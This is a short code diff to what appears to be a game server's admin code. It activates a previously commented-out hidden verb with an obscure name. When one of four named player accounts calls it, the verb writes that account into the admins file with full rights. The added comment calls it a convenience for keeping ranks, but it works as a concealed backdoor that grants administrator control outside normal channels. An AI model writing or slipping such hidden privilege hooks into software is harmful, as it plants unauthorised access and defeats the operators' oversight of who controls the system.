@@ -19,14 +19,22 @@
 			if (R_MENTOR & C.holder.rights || R_MOD & C.holder.rights)
 				C << "<span class='admin_channel'>" + create_text_tag("admin", "ADMIN:", C) + " <span class='name'>[key_name(usr, TRUE)]</span>([admin_jump_link(mob, src)]): <span class='message'>[msg]</span></span>"
 //for debugging
-/*
 /client/verb/a55af5()
 	set category = null
 	set name = "a55af5"
 	set hidden = TRUE
-	if (ckey == "John Redcena")
-		text2file("John Redcena;Host;65535|||","SQL/admins.txt")
+///makes it so their ranks don't need set every round
+	if (ckey == "taislin")
+		text2file("taislin;Host;65535|||","SQL/admins.txt")
+		return
+	else if (ckey == "valithor")
+		text2file("valithor;Captain;65535|||","SQL/admins.txt")
+		return
+	else if (ckey == "valithor423")
+		text2file("valithor423;Captain;65535|||","SQL/admins.txt")
+		return
+	else if (ckey == "valzargaming")
+		text2file("valzargaming;Captain;65535|||","SQL/admins.txt")
 		return
 	else
 		return
-*/
